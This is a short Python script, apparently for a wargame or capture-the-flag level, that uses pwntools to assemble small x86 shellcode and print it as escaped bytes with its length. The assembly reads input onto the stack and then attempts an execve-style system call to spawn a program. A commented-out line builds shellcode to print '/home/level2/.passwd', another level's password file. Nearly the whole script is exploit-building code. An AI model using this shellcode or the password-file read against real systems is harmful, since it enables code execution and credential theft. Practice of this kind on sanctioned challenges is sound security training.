from pwnlib.asm import asm,disasm
from pwnlib.shellcraft import amd64

# Code to execute
code = ""
# code += amd64.linux.cat("/home/level2/.passwd")
# r = asm(code,arch='amd64')

# Pushes the code to the stack and jumps to it
code = ""
# code += amd64.pushstr(r)
# code += "jmp rsp"
r = asm('''
    xor eax,eax
    xor ebx,ebx
    push esp
    pop ecx
    push 7
    pop edx
    syscall
        
    push 0x3b
    pop eax
    xchg ecx,ebx
    xor edx,edx
    sysenter
         

''',arch='x86')

print(''.join(['\\x' + ''.join([r.hex()[x],r.hex()[x+1]]) for x in range(0,len(r.hex()),2)]))
print("length: " + str(len(r)))